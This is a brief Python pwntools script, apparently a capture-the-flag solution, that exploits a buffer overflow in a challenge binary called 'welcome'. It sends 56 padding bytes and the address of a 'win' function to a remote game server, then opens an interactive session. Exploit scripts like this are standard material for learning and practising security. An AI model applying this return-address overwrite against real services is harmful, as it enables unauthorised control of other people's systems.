from pwn import *

context.binary = elf = ELF('./welcome')

io = remote('pwn.h4ckingga.me', 10001)
io.recvuntil(b'pwnable?\n')
io.sendline(b'i'*56 + p64(elf.sym['win']))
io.interactive()